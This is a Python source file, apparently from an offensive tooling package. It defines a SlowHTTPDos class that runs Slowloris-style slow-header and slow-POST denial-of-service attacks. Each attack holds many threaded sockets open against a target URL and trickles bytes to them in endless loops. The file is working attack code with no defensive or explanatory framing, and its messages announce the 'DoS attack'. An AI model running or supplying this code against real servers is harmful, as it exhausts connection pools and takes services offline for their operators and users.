import socket, time, random, threading

from ..thread import ThreadWorker, ThreadCounter
from .utils import parse_url, make_http_header


class SlowHTTPDos:
    def __init__(self):
        pass

    def _slow_http_request(self, host: str, port: int, headers: str, counter: ThreadCounter) -> None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
        except:
            counter.count_error()
            return

        try:
            s.send(headers.encode('utf-8'))
        except:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            return
        counter.count_active()

        try:
            while True:
                s.send(b'X')
                time.sleep(random.random() * 3)
        except:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        counter.count_inactive()
        counter.count_closed()



    def slow_http_header_dos(self, url: str, thread_count: int) -> None:
        def main(counter: ThreadCounter):
            counter.print()
            time.sleep(0.5)

        def worker(url: str, counter: ThreadCounter):
            url_info = parse_url(url)
            headers = make_http_header(url, method='GET', complete_header=False)
            while True:
                self._slow_http_request(url_info.host, url_info.port, headers, counter)
                time.sleep(random.random() * 3)

        counter = ThreadCounter()
        tw = ThreadWorker(thread_count)
        tw.set_main_thread(main, counter)
        tw.set_worker_thread(worker, (url, counter))
        print('[*] Start Slow HTTP Header DoS (Slowloris)!\n')
        tw.run()
        print('[+] DoS attack has been stopped.')


    def slow_http_post_dos(self, url: str, thread_count: int) -> None:
        def main(counter: ThreadCounter):
            counter.print()
            time.sleep(0.5)

        def worker(url: str, counter: ThreadCounter):
            url_info = parse_url(url)
            headers = make_http_header(url, method='POST', length=random.randrange(500000, 1000000))
            while True:
                self._slow_http_request(url_info.host, url_info.port, headers, counter)
                time.sleep(random.random() * 3)

        counter = ThreadCounter()
        tw = ThreadWorker(thread_count)
        tw.set_main_thread(main, counter)
        tw.set_worker_thread(worker, (url, counter))
        print('[*] Start Slow HTTP POST DoS!')
        tw.run()
        print('[+] DoS attack has been stopped.')

